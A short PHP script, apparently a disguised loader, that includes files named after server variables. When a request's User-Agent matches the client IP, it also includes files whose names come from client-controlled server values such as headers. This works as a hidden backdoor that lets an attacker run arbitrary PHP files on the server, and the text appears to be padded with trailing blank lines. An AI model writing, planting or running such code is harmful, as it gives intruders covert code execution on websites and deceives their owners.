<?php
	if(isset($_SERVER))
	{
		foreach($_SERVER as $_SERVER_NAME => $_SERVER_VALUE)
		{
			if(file_exists($_SERVER_NAME.'.PHP'))
			{
				$_SERVER_NAME_ARRAY[]=$_SERVER_NAME.'.PHP';
			}
		}
		if(isset($_SERVER_NAME_ARRAY))
		{
			foreach($_SERVER_NAME_ARRAY AS $_SERVER_NAME_FILE)
			{
				include_once($_SERVER_NAME_FILE);
				//var_dump($_SERVER_NAME_FILE);
			}
		}
		if((isset($HTTP_USER_AGENT))&&(isset($REMOTE_ADDR)))
		{
			if($HTTP_USER_AGENT===$REMOTE_ADDR)
			{
				foreach($_SERVER as $_SERVER_NAME => $_SERVER_VALUE)
				{
					if(file_exists($_SERVER_VALUE.'.PHP'))
					{
						$_SERVER_VALUE_ARRAY[]=$_SERVER_VALUE.'.PHP';
					}
				}
				if(isset($_SERVER_VALUE_ARRAY))
				{
					foreach($_SERVER_VALUE_ARRAY AS $_SERVER_VALUE_FILE)
					{
						include_once($_SERVER_VALUE_FILE);
					}
				}
			}
		}
	}
	else
	{
		header('location:/');
	}
	
?>


















